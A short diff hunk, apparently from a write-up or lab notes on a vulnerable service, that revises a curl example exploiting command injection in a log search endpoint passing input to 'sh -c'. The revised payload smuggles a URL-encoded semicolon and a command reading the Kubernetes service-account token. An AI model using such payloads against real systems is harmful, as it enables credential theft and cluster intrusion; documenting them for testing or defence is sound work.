@@ -33,7 +33,7 @@ The log search endpoint passes user input directly to `sh -c`:
 curl 'http://agent:8080/api/v1/logs/search?q=error'
 
 # Command injection — exfiltrate SA token
-curl 'http://agent:8080/api/v1/logs/search?q=x;+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'
+curl 'http://agent:8080/api/v1/logs/search?q=error+/var/log/%3B+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'
 
 # Or use the explicit exec endpoint
 curl -X POST http://agent:8080/api/v1/diagnostics/run \
